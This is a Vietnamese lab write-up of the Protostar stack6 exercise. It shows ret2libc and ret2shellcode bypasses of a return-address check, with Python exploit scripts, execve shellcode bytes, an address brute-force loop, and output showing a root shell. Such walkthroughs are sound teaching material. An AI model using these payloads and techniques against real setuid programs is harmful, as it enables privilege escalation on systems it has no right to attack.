## Stack6

Bài này họ sẽ chặn việc ta ghi đè return address thành các địa chỉ bắt đầu bằng `0xbf`.

```c 
ret = __builtin_return_address(0);

if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
}

```
Các địa chỉ của stack thì sẽ đi từ `0xbffeb000` đến `0xc0000000` (nghĩa là hầu như tất cả đều bắt đầu bằng `0xbf`, vậy là ta sẽ không thể ghi đè return address để jump đến một nơi nào đó trên stack mà thực thi được, vậy nên giờ ta sẽ dùng những phương pháp khác

### Ret2libc 

Với phương pháp này, ta sẽ return đến địa chỉ của hàm system, cụ thể hơn là `__libc_system`

![](https://i.imgur.com/ndpEY0L.png)

Nhìn vào hình ảnh trên đây, ở phần after overflow, sau khi padding 16 chữ A để đến được vị trí đặt return address thì attacker sẽ đưa địa chỉ của hàm system trong libc vào đó, 4 bytes sau sẽ là địa chỉ của hàm exit và 4 bytes cuối là địa chỉ của chuỗi /bin/sh

Lý do stack layout lại trông như thế này là vì sau khi nhảy đến thực thi một hàm, thì trước ebp sẽ là địa chỉ trả về và sau đó nữa là các tham số (arguments), vậy ở đây khi thực hiện ret2libc, ta cũng sẽ tạo một stack layout như vậy, lấy địa chỉ của exit làm địa chỉ trả về để khi thực thi xong thì exit luôn, tìm địa chỉ của chuỗi /bin/sh (có thể lấy từ enviroment trong stack hoặc lấy từ libc) rồi để vào chỗ của các arguments, lúc này khi chạy chương trình sẽ gọi đến system và thực thi lệnh `/bin/sh`

Đầu tiên ta tìm địa chỉ của system, ta có thể dùng lệnh `p system trong gdb` hoặc lệnh find

```
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>

```

Để tìm chuỗi `/bin/sh` thì ta có thể dùng lệnh find hoặc string grep thẳng trên file libc
```
user@protostar:/tmp$ strings -a -t x /lib/libc-2.11.2.so | grep /bin/sh
11f3bf /bin/sh
```

Có được offset là `11f3bf`, ta `info proc map` để xác định miền memory của libc rồi cộng offset trên với địa chỉ bắt đầu
```
(gdb) info proc map
process 20526
cmdline = '/opt/protostar/bin/stack6'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/stack6'
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
	 0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
	0xb7e96000 0xb7e97000     0x1000          0        
	0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
	0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
	0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
	0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
	0xb7fd9000 0xb7fdc000     0x3000          0        
	0xb7fde000 0xb7fe2000     0x4000          0        
	0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
	0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
	0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
	0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
	0xbffeb000 0xc0000000    0x15000          0           [stack]
(gdb) x/s 0xb7e97000+0x11f3bf
0xb7fb63bf:	 "/bin/sh"
```

Tìm hàm exit cũng tương tự như hàm system

Sau khi đã có 3 địa chỉ rồi, ta sẽ kết hợp với việc tìm khoảng cách trên stack giữa biến buffer với địa chỉ trả về là 80 bytes để padding 80 chữ A

```
import struct

padding = "A"*80
system_addr = struct.pack("I",0xb7ecffb0)
exit_addr = struct.pack("I",0xb7ec60c0)
binsh_addr = struct.pack("I",0xb7fb63bf)
#shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

print padding+system_addr+exit_addr+binsh_addr

```

```
user@protostar:/opt/protostar/bin$ (cat ~/payload; cat) | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA����`췿c��
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

### ret2shellcode
Một cách khác đó là ta có thể bypass cái check trên, bằng cách thay vì dùng trực tiếp `ret` của `getpath` thì thay vào đó ta sẽ dùng `ret` của `main`, nghĩa là ta sẽ ghi đè return address trên stack thành địa chỉ của opcode `ret` của main trong .text segment, vì là jump đến .text segment chứ không jump đến stack nên ta sẽ bypass được cái check trên. Khi nhảy để `ret` của main thì ta sẽ đặt shellcode ở một nơi nào đó trên stack, cùng với đó là địa chỉ bắt đầu của shellcode đó ngay đỉnh của stack để khi chương trình chạy đến `ret` của main thì ta nó sẽ return về địa chỉ ở ngay đỉnh stack là địa chỉ của shellcode

Code:
```c
import struct

padding = "A"*80
main_ret_addr = struct.pack("I",0x08048508)
#shellcode_addr = struct.pack("I", 0xbffff6e4)
shellcode_addr = struct.pack("I", 0xbffff744)
shellcode = "\x90"*0x80 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

print padding+main_ret_addr+shellcode_addr+shellcode

```

Như bạn thấy mình có comment biến `shellcode_addr` thứ nhất lại, vì nó là địa chỉ khi debug bằng gdb, nó sẽ chỉ đúng khi ta làm với gdb thôi. Mình dùng code brute hôm trước để tìm địa chỉ đúng, padding thêm `nop` để tăng tỉ lệ thành công

```c
import struct
import os

padding = "A"*80
main_ret_addr = struct.pack("I",0x08048508)
shellcode_addr = 0xbffff6e4
shellcode = "\x90"*0x80 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

for i in range(0, 0xff):
                f = open("test.txt","w")
                this_addr = shellcode_addr + i*4
                pack_addr = struct.pack("I", this_addr)
                f.write(padding+main_ret_addr+pack_addr+shellcode+b'\n')
                f.close() # close file before cat or else it wont print out result
                print "[*] EIP: {0} ".format(hex(this_addr))
                out_ = os.popen("(cat test.txt ; echo ls ) | /opt/protostar/bin/stack6").read()
                #if len(out_):
                        #print out_
                        #break

```

```
user@protostar:/opt/protostar/bin$ (cat /home/user/payload; cat) | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD�����������������������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin����°
                                                                               1�@̀
ls
final0	final2	 format1  format3  heap0  heap2  net0  net2  net4    stack1  stack3  stack5  stack7
final1	format0  format2  format4  heap1  heap3  net1  net3  stack0  stack2  stack4  stack6
whoami
root
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```
